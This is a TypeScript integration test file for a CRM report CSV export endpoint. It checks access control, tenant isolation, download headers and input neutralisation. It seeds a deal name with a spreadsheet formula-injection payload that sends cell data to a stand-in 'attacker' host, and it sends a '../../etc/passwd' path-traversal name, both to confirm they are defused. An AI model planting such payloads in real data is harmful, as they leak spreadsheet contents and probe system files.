import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import { pool } from '../config/database';
import { app, setupWorkspace, teardownWorkspace, auth, addUserWithRole, TestWorkspace } from './helpers';
import { resetReportsPool } from '../config/reportsDatabase';
import { CANNED_PREFIX } from '../services/reports/canned';

/**
 * CSV EXPORT, END TO END. P3 Phase 7.
 *
 * The file-shaping rules are unit-tested in reportCsv.test.ts. What is pinned
 * HERE is everything that needs a real request:
 *
 *  - an export enforces the SAME visibility as a run, so it cannot become a
 *    way to read a report you may not open;
 *  - it is tenant-scoped, through the same restricted pool;
 *  - it downloads as an inert attachment rather than rendering in the browser;
 *  - a user-supplied deal name survives the round trip NEUTRALISED.
 */
describe('Report CSV export', () => {
  let ws: TestWorkspace;
  let other: TestWorkspace;
  let outsider: TestWorkspace;
  let reportId: string;

  const seedDeal = async (w: TestWorkspace, name: string, value: number) => {
    await pool.query(
      `INSERT INTO deals (name, value, currency, source, tenant_id, stage_id, is_seed, is_test)
       VALUES ($1, $2, 'USD', 'referral', $3,
               (SELECT id FROM pipeline_stages WHERE tenant_id = $3 ORDER BY position LIMIT 1),
               false, false)`,
      [name, value, w.tenantId],
    );
  };

  beforeAll(async () => {
    ws = await setupWorkspace('csvexp');
    other = await setupWorkspace('csvexp-other');
    outsider = await addUserWithRole(ws, 'sales');

    await seedDeal(ws, 'Ordinary deal', 100);
    // The attack, stored as a real record the way a user would create it.
    await seedDeal(ws, '=HYPERLINK("http://attacker/?x="&A1,"click me")', 200);
    await seedDeal(other, 'THEIR SECRET DEAL', 9999);

    const created = await request(app).post('/api/v1/reports').set(auth(ws)).send({
      name: 'Deals by name',
      definition: {
        v: 1, base: 'deals',
        dimensions: [{ field: 'deals.name' }],
        metrics: [{ agg: 'sum', field: 'deals.value' }],
      },
    });
    reportId = created.body.data.id;
  });

  afterAll(async () => {
    const tenants = [ws.tenantId, other.tenantId];
    await pool.query('DELETE FROM saved_reports WHERE tenant_id = ANY($1::uuid[])', [tenants]);
    await pool.query('DELETE FROM deals WHERE tenant_id = ANY($1::uuid[])', [tenants]);
    await teardownWorkspace(other);
    await teardownWorkspace(ws);
    await resetReportsPool();
  });

  // ── Access ───────────────────────────────────────────────────────────────

  it('exports a report the caller owns', async () => {
    const res = await request(app).get(`/api/v1/reports/${reportId}/export.csv`).set(auth(ws));
    expect(res.status).toBe(200);
    expect(res.text).toContain('Ordinary deal');
  });

  it('refuses to export a report the caller cannot VIEW', async () => {
    /*
     * The important one. An export that checked access more loosely than a run
     * would be a way to read a report you cannot open — the same shape of
     * mistake as a second data path around tenant scoping. `outsider` is in
     * the same workspace and has no grant.
     */
    const res = await request(app).get(`/api/v1/reports/${reportId}/export.csv`).set(auth(outsider));
    expect(res.status).toBe(404);
    expect(res.text).not.toContain('Ordinary deal');
  });

  it('refuses a report belonging to another workspace', async () => {
    const res = await request(app).get(`/api/v1/reports/${reportId}/export.csv`).set(auth(other));
    expect(res.status).toBe(404);
  });

  it('requires authentication', async () => {
    expect((await request(app).get(`/api/v1/reports/${reportId}/export.csv`)).status).toBe(401);
    expect((await request(app).post('/api/v1/reports/export.csv').send({})).status).toBe(401);
  });

  it('never contains another workspace\'s rows', async () => {
    const res = await request(app).get(`/api/v1/reports/${reportId}/export.csv`).set(auth(ws));
    expect(res.status).toBe(200);
    expect(res.text).not.toContain('THEIR SECRET DEAL');
    expect(res.text).not.toContain('9999');
  });

  // ── The attack, surviving a real round trip ──────────────────────────────

  it('neutralises a formula stored in a real deal name', async () => {
    const res = await request(app).get(`/api/v1/reports/${reportId}/export.csv`).set(auth(ws));
    expect(res.status).toBe(200);
    // Present as DATA...
    expect(res.text).toContain('HYPERLINK');
    // ...but never at the start of a cell, which is what makes it execute.
    // The cell is quoted (it contains a comma), so the apostrophe sits just
    // inside the opening quote.
    expect(res.text).toContain('"\'=HYPERLINK');
    expect(res.text).not.toContain(',=HYPERLINK');
    expect(res.text).not.toMatch(/^=HYPERLINK/m);
  });

  // ── Transport ────────────────────────────────────────────────────────────

  it('downloads as an inert attachment rather than rendering', async () => {
    const res = await request(app).get(`/api/v1/reports/${reportId}/export.csv`).set(auth(ws));
    expect(res.headers['content-type']).toContain('text/csv');
    expect(res.headers['content-disposition']).toMatch(/^attachment;/);
    expect(res.headers['content-disposition']).toContain('deals-by-name-');
    // Shared with every other download in this app, via streamHeaders.
    expect(res.headers['x-content-type-options']).toBe('nosniff');
    expect(res.headers['content-security-policy']).toContain("default-src 'none'");
    expect(res.headers['cache-control']).toContain('no-store');
  });

  it('leads with a BOM so Excel reads UTF-8 rather than mangling it', async () => {
    // The target markets are India, the Middle East and Africa; account names
    // are not all ASCII.
    const res = await request(app).get(`/api/v1/reports/${reportId}/export.csv`).set(auth(ws));
    expect(res.text.charCodeAt(0)).toBe(0xFEFF);
  });

  // ── Canned, and ad hoc ───────────────────────────────────────────────────

  it('exports a canned report, caveat included', async () => {
    const res = await request(app)
      .get(`/api/v1/reports/${CANNED_PREFIX}revenue-by-industry/export.csv`).set(auth(ws));
    expect(res.status).toBe(200);
    expect(res.text).toContain('About this report');
    expect(res.text).toContain('Industry lives on the account');
  });

  it('exports an unsaved definition from the builder', async () => {
    const res = await request(app).post('/api/v1/reports/export.csv').set(auth(ws)).send({
      name: 'Scratch',
      definition: {
        v: 1, base: 'deals',
        dimensions: [{ field: 'deals.source' }],
        metrics: [{ agg: 'count' }],
      },
    });
    expect(res.status).toBe(200);
    expect(res.headers['content-disposition']).toContain('scratch-');
    expect(res.text).toContain('Data note');
  });

  it('rejects an ad-hoc export with no definition, and one that will not compile', async () => {
    const none = await request(app).post('/api/v1/reports/export.csv').set(auth(ws)).send({});
    expect(none.status).toBe(400);

    const bad = await request(app).post('/api/v1/reports/export.csv').set(auth(ws)).send({
      definition: { v: 1, base: 'employees', metrics: [{ agg: 'count' }] },
    });
    expect(bad.status).toBe(400);
  });

  it('a saved report that no longer compiles exports as 409, matching its run', async () => {
    const broken = await pool.query(
      `INSERT INTO saved_reports (tenant_id, name, definition, owner_id)
       VALUES ($1, 'Broken', $2::jsonb, $3) RETURNING id`,
      [ws.tenantId, JSON.stringify({ v: 1, base: 'deals', dimensions: [{ field: 'deals.nope' }] }), ws.userId],
    );
    const res = await request(app)
      .get(`/api/v1/reports/${broken.rows[0].id}/export.csv`).set(auth(ws));
    expect(res.status).toBe(409);
  });

  it('the ad-hoc name is display text, and cannot break the filename header', async () => {
    const res = await request(app).post('/api/v1/reports/export.csv').set(auth(ws)).send({
      name: '../../etc/passwd',
      definition: { v: 1, base: 'deals', metrics: [{ agg: 'count' }] },
    });
    expect(res.status).toBe(200);
    const cd = res.headers['content-disposition'];
    expect(cd).not.toContain('..');
    expect(cd).not.toMatch(/[\r\n]/);
  });
});
